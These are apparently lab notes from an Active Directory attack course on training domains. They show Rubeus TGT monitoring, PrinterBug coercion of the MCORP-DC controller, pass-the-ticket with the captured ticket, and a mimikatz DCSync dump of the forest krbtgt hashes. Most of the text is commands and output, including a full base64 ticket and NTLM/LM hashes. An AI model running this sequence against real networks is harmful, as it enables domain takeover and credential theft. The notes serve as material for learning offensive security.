- RDP to the `DCORP-DC`, transfer `Rubeus.exe` and start it in monitor mode.
```
PS C:\Windows\Tasks> cp //172.16.100.3/MyTools/Rubeus.exe .
PS C:\Windows\Tasks> .\Rubeus.exe monitor /interval:5 /targetuser:MCORP-DC$ /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: TGT Monitoring
[*] Target user     : MCORP-DC$
[*] Monitoring every 5 seconds for new TGTs
```

- Use PrinterBug to coerce authentication of `MCORP-DC` to `DCORP-DC`.
```
PS C:\AD\MyTools> .\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-dc.dollarcorp.moneycorp.local
Target server attempted authentication and got an access denied.  If coercing authentication to an NTLM challenge-response capture tool(e.g. responder/inveigh/MSF SMB capture), this is expected and indicates the coerced authentication worked.
```

- Capture the incoming TGT.
```
<snip>

[*] 8/10/2023 9:53:46 AM UTC - Found new TGT:

  User                  :  MCORP-DC$@MONEYCORP.LOCAL
  StartTime             :  8/9/2023 9:05:57 PM
  EndTime               :  8/10/2023 7:05:42 AM
  RenewTill             :  8/16/2023 9:05:42 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    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

[*] Ticket cache size: 1
```

- Use the captured TGT to escalate privileges to EA.
- A ticket for `MCORP-DC$`  can not be used to remotely access the Enterprise DC.
```
PS C:\AD\MyTools> .\Rubeus.exe ptt /ticket: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

PS C:\AD\MyTools> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK
mimikatz # lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local
[DC] 'moneycorp.local' will be the domain
[DC] 'mcorp-dc.moneycorp.local' will be the DC server
[DC] 'mcorp\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 10:46:24 PM
Object Security ID   : S-1-5-21-335606122-960912869-3279953914-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: a0981492d5dfab1ae0b97b51ea895ddf
    ntlm- 0: a0981492d5dfab1ae0b97b51ea895ddf
    lm  - 0: 87836055143ad5a507de2aaeb9000361
```

